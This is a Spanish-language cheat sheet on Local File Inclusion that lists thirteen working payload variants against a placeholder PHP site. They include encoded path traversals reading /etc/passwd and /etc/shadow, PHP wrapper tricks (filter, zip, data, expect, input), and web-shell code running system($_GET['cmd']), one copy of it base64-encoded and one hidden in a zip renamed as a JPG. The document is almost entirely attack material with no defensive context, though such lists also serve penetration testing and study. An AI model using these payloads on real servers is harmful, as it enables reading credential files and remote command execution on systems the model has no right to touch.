## Local File Inclusion (LFI)

La inclusión de archivos locales es una técnica de ataque en la que los atacantes engañan a una aplicación web para que ejecute o exponga archivos en un servidor web. 


Se puede encontrar en cualquier extremo que incluya un archivo de un servidor web. Por ejemplo, /index.php?page=index.html

## Explotando

1 - Carga útil básica

    http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    
2 - Codificación de URL

    http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

3 - Codificación doble 

    http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
    
4 - Codificación UTF-8

    http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
    
5 - Uso de null byte (%00)

    http://example.com/index.php?page=../../../etc/passwd%00
    
6 - Desde una carpeta existente

    http://example.com/index.php?page=scripts/../../../../../etc/passwd
    
7 - Usando PHP Wrappers: filter

    http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
    http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
    
8 - Usando PHP Wrappers: zlib

    http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
    
9 - Usando PHP Wrappers: zip

    echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
    zip payload.zip payload.php;
    mv payload.zip shell.jpg;
    rm payload.php

    http://example.com/index.php?page=zip://shell.jpg%23payload.php
    
10 - Usando PHP Wrappers: data

    http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
    
11 - Usando PHP Wrappers: expect

    http://example.com/index.php?page=expect://ls
    
12 - Usando PHP Wrappers: input

    POST /index.php?page=php://input&cmd=ls HTTP/1.1
    Host: example.com
    ...

    <?php echo shell_exec($_GET['cmd']); ?>
    
13 - Algunos Bypassing

    http://example.com/index.php?page=....//....//etc/passwd
    http://example.com/index.php?page=..///////..////..//////etc/passwd
    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
    http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
    http://example.com/index.php?page=/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
